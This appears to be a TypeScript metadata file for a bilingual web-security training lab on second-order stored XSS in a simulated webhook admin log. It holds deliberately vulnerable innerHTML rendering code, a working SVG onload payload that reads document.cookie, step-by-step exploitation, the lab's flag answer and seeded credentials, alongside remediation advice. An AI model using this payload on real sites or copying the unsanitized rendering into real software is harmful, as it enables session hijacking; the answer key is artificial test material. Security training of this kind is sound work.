// src/modules/practice-labs/xss/labs/lab5/lab5.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const xssLab5Metadata: LabMetadata = {
  slug: 'xss-webhook-second-order',
  title: 'XSS: Second-Order Webhook Admin Takeover',
  ar_title: 'XSS من الدرجة الثانية: الاستيلاء على حساب المشرف عبر Webhook',
  description:
    'Plant a second-order XSS payload in a webhook integration name that executes when the super-admin visits the Activity Log dashboard — stealing their session token.',
  ar_description:
    'ازرع XSS payload من الدرجة الثانية في اسم تكامل Webhook يُنفَّذ عندما يزور المشرف الأعلى لوحة سجل النشاط — مما يسرق رمز جلسته.',
  difficulty: 'ADVANCED',
  category: 'WEB_SECURITY',
  skills: [
    'Second-Order Stored XSS',
    'Multi-Context Injection',
    'Admin Session Hijacking',
    'SaaS Integration Attack Surface',
  ],
  xpReward: 350,
  pointsReward: 175,
  duration: 60,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: "Create a webhook integration with a malicious name. Then trigger the super-admin's Activity Log view to execute your payload in the admin's browser context and capture their session token as the flag.",
  ar_goal:
    'أنشئ تكامل webhook باسم خبيث. ثم افعّل عرض سجل النشاط للمشرف الأعلى لتنفيذ payload الخاص بك في سياق متصفح الأدمن والتقاط رمز جلسته كعلم.',

  briefing: {
    en: `FlowSync — a SaaS automation platform. Webhooks, integrations, automations.
Think Zapier. Think n8n. Enterprise-grade.
You're integration_manager. You can create webhook integrations.
Each webhook has a name: "Slack Notifications", "GitHub Deploy Hook", etc.
Names are stored in the database.
Names appear in the Activity Log — every action is logged.
The Activity Log is the super_admin's audit tool.
They review it daily. Every webhook creation. Every trigger. Every error.
The Activity Log renders webhook names as HTML in a table row.
Without sanitization.
You create a webhook named "<b>Slack</b>".
The next day, the admin opens the log.
Your webhook name renders bold.
One step ahead.`,
    ar: `FlowSync — منصة SaaS للأتمتة. Webhooks وتكاملات وأتمتة.
فكّر في Zapier. فكّر في n8n. على مستوى المؤسسات.
أنت integration_manager. يمكنك إنشاء تكاملات webhook.
لكل webhook اسم: "Slack Notifications"، "GitHub Deploy Hook"، إلخ.
الأسماء تُحفَظ في قاعدة البيانات.
الأسماء تظهر في سجل النشاط — كل إجراء مُسجَّل.
سجل النشاط هو أداة تدقيق super_admin.
يراجعه يومياً. كل إنشاء webhook. كل تشغيل. كل خطأ.
يعرض سجل النشاط أسماء webhooks كـ HTML في صف جدول.
بدون تعقيم.
تنشئ webhook باسم "<b>Slack</b>".
في اليوم التالي، يفتح الأدمن السجل.
اسم webhook الخاص بك يُعرَض بخط عريض.
خطوة واحدة للأمام.`,
  },

  stepsOverview: {
    en: [
      'Create a webhook with a test HTML name (<b>Test</b>) — verify it renders bold in the Activity Log',
      'Understand the "second-order" nature: creation is safe, but rendering in the admin log is not',
      'Craft a webhook name containing an auto-firing XSS payload',
      'Trigger the super-admin Activity Log simulation',
      'Payload fires in admin context — session token captured as flag',
    ],
    ar: [
      'أنشئ webhook باسم HTML تجريبي (<b>Test</b>) — تحقق من عرضه بخط عريض في سجل النشاط',
      'افهم الطبيعة "من الدرجة الثانية": الإنشاء آمن، لكن العرض في سجل الأدمن ليس كذلك',
      'صمّم اسم webhook يحتوي على XSS payload يُطلَق تلقائياً',
      'افعّل محاكاة سجل نشاط super-admin',
      'يُطلَق الـ payload في سياق الأدمن — رمز الجلسة يُلتقَط كعلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'FlowSync stores webhook names safely on creation. But the Activity Log rendering uses innerHTML without sanitization — injecting each log entry\'s webhookName directly as HTML. The payload is inert at creation time but executes when the admin loads the Activity Log. This "second-order" nature means standard input validation on the creation endpoint gives false security.',
    vulnerableCode:
      '// Webhook creation — stored safely (no issue here):\n' +
      'await db.integrations.create({ name: webhookName, userId });\n\n' +
      '// Activity Log rendering — rendered UNSAFELY (the vulnerability):\n' +
      'activityLog.forEach(entry => {\n' +
      '  logContainer.innerHTML +=\n' +
      '    `<tr><td>${entry.user}</td><td>${entry.webhookName}</td><td>${entry.action}</td></tr>`;\n' +
      '});',
    exploitation:
      '1. POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com/hook" }\n' +
      '2. POST /admin/simulate-activity-log → renders all log entries → SVG onload fires in admin context → flag returned.',
    steps: {
      en: [
        'POST /integrations { "name": "<b>TestHook</b>", "endpoint": "https://example.com" } → webhook created',
        'POST /admin/simulate-activity-log → log renders → "TestHook" appears bold → HTML injection confirmed',
        'POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com" } → XSS payload stored as webhook name',
        'POST /admin/simulate-activity-log → SVG onload fires in admin context → admin cookie alerted → FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9} returned',
      ],
      ar: [
        'POST /integrations { "name": "<b>TestHook</b>", "endpoint": "https://example.com" } → webhook مُنشَأ',
        'POST /admin/simulate-activity-log → يعرض السجل → "TestHook" يظهر بخط عريض → تم تأكيد حقن HTML',
        'POST /integrations { "name": "<svg onload=alert(document.cookie)>", "endpoint": "https://example.com" } → XSS payload مُحفَظ كاسم webhook',
        'POST /admin/simulate-activity-log → يُطلَق SVG onload في سياق الأدمن → تنبيه كوكي الأدمن → يُعاد FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9}',
      ],
    },
    fix: [
      'Sanitize at render time: use DOMPurify on every user-supplied field before innerHTML assignment',
      'Replace innerHTML with createElement/textContent for table row construction',
      'Validate webhook names server-side: reject entries containing < > characters',
      'Admin panels are highest-risk rendering contexts — apply strictest sanitization policies here',
    ],
  },

  postSolve: {
    explanation: {
      en: 'Second-Order Stored XSS is the most deceptive XSS variant. The injection point (webhook creation) appears safe because the data is stored as-is without immediate rendering. The vulnerable rendering happens elsewhere — in a different endpoint, often with elevated privileges (admin panel). Standard security testing often misses second-order XSS because testers check the creation response, not every downstream consumer of the stored data.',
      ar: 'الـ Second-Order Stored XSS هو أكثر أنواع XSS خداعاً. تبدو نقطة الحقن (إنشاء webhook) آمنة لأن البيانات تُحفَظ كما هي دون عرض فوري. يحدث العرض الضعيف في مكان آخر — في نقطة نهاية مختلفة، غالباً بامتيازات مرتفعة (لوحة الأدمن). كثيراً ما تُفوّت اختبارات الأمن القياسية Second-Order XSS لأن المختبرين يفحصون استجابة الإنشاء، لا كل مستهلك لاحق للبيانات المُحفَظة.',
    },
    impact: {
      en: "Complete super-admin account takeover. The attack is stealthy — no suspicious URLs, no unusual behavior during webhook creation. The payload lies dormant until the admin's natural workflow triggers it. In enterprise SaaS, this can lead to full platform compromise, data exfiltration, and backdoor creation.",
      ar: 'الاستيلاء الكامل على حساب super-admin. الهجوم خفي — لا URLs مشبوهة، لا سلوك غير معتاد أثناء إنشاء webhook. يبقى الـ payload نائماً حتى يُطلقه سير عمل الأدمن الطبيعي. في SaaS للمؤسسات، يمكن أن يؤدي هذا إلى اختراق كامل للمنصة وتسريب بيانات وإنشاء باب خلفي.',
    },
    fix: [
      'Track every field that originates from user input and ensure ALL rendering paths sanitize it',
      'Second-order testing: for every stored value, trace where it is rendered — not just the creation endpoint',
      'DOMPurify on all innerHTML assignments without exception: even for "internal" admin-only views',
      "Content Security Policy as defense-in-depth: script-src 'self' nonce — blocks inline handlers even if injected",
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 25,
      content:
        'Create a webhook with name <b>Test Hook</b>. Use POST /admin/simulate-activity-log — if the webhook name appears bold in the log, HTML injection is confirmed in the admin rendering context.',
    },
    {
      order: 2,
      xpCost: 40,
      content:
        'The vulnerability is NOT in the webhook creation endpoint — it is in how the Activity Log renders stored names. The payload is inert when created, it only fires when the admin loads the log.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'Use an SVG payload as the webhook name: <svg onload="alert(document.cookie)">. The SVG onload event fires automatically when the element is inserted into the DOM — no user interaction needed.',
    },
  ],

  flagAnswer: 'FLAG{XSS_2ND_ORDER_WEBHOOK_ADMIN_PWNED_X9}',
  initialState: {
    users: [
      {
        username: 'super_admin',
        password: 'SUP3R_S3CUR3_ADM!N_PASS',
        role: 'ADMIN',
      },
      {
        username: 'integration_manager',
        password: 'int_mgr_2024!',
        role: 'USER',
      },
    ],
    contents: [
      {
        title: 'Slack Notifications',
        body: 'webhook',
        meta: {
          endpoint: 'https://hooks.slack.com/xxx',
          events: ['deploy', 'alert'],
          status: 'active',
        },
      },
      {
        title: 'GitHub Deploy Trigger',
        body: 'webhook',
        meta: {
          endpoint: 'https://api.github.com/repos/xxx/dispatches',
          events: ['push'],
          status: 'active',
        },
      },
    ],
    logs: [
      {
        action: 'WEBHOOK_CREATED',
        meta: {
          webhookName: 'Slack Notifications',
          createdBy: 'integration_manager',
          timestamp: '2026-02-28T10:00:00Z',
        },
      },
      {
        action: 'WEBHOOK_TRIGGERED',
        meta: {
          webhookName: 'GitHub Deploy Trigger',
          triggeredBy: 'system',
          status: 'success',
          timestamp: '2026-03-01T08:30:00Z',
        },
      },
    ],
  },
};
